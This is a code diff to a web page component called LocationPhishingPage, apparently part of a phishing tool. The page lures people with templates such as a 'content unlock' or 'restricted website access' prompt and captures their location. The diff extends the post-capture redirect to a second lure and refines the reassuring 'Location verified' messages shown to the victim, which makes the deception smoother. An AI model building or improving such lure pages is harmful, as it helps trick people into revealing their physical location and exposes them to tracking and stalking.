@@ -57,7 +57,11 @@ const templateContent: Record<string, TemplateContent> = {
   }
 };
 
-const CONTENT_UNLOCK_REDIRECT_URL_KEY = 'contentUnlockRedirectUrl';
+// Define localStorage keys for redirection
+const REDIRECT_URL_KEYS: Record<string, string> = {
+  'content-unlock': 'contentUnlockRedirectUrl',
+  'restricted-website-access': 'restrictedWebsiteRedirectUrl',
+};
 
 export default function LocationPhishingPage() {
   const { addLog } = useLogs();
@@ -87,18 +91,21 @@ export default function LocationPhishingPage() {
 
   useEffect(() => {
     if (status === 'captured') {
-      if (templateId === 'content-unlock') {
-        const redirectUrl = localStorage.getItem(CONTENT_UNLOCK_REDIRECT_URL_KEY);
+      const redirectKey = REDIRECT_URL_KEYS[templateId];
+      if (redirectKey) {
+        const redirectUrl = localStorage.getItem(redirectKey);
         if (redirectUrl && redirectUrl.trim() !== '') {
-          setStatusMessage("Location verified. Thank you. Now you'll be redirected to the wanted website.");
+          setStatusMessage("Location verified. Thank you. You will now be redirected.");
           setTimeout(() => {
             window.location.href = redirectUrl;
           }, 2500);
         } else {
+          // If the key exists but no URL, it means redirection is supported but not configured
           setStatusMessage("Location verified. Thank you. This window can now be closed.");
         }
       } else {
-        setStatusMessage(undefined); 
+        // For templates that don't support redirection (e.g., security-alert, default)
+        setStatusMessage("Location verified. Thank you. This window can now be closed.");
       }
     } else {
       setStatusMessage(undefined);
@@ -263,14 +270,12 @@ export default function LocationPhishingPage() {
           <div className="text-center p-4 bg-green-100 border border-green-300 rounded-md shadow">
             <CheckCircle className="mx-auto h-12 w-12 text-green-600 mb-2" />
             <p className="text-xl font-semibold text-green-700">
-              {templateId === 'content-unlock' && localStorage.getItem(CONTENT_UNLOCK_REDIRECT_URL_KEY) && localStorage.getItem(CONTENT_UNLOCK_REDIRECT_URL_KEY)?.trim() !== ''
-                ? "Location verified. Thank you. Now you'll be redirected to the wanted website."
-                : "Location Verified"}
+              {statusMessage || "Location Verified"}
             </p>
             <p className="text-md text-green-600">
-              {templateId === 'content-unlock' && localStorage.getItem(CONTENT_UNLOCK_REDIRECT_URL_KEY) && localStorage.getItem(CONTENT_UNLOCK_REDIRECT_URL_KEY)?.trim() !== ''
-                ? "Please wait."
-                : "Thank you. This window can now be closed."}
+              { (REDIRECT_URL_KEYS[templateId] && localStorage.getItem(REDIRECT_URL_KEYS[templateId])?.trim() !== '')
+                ? "Please wait while we redirect you..."
+                : "This window can now be closed." }
             </p>
           </div>
         )}
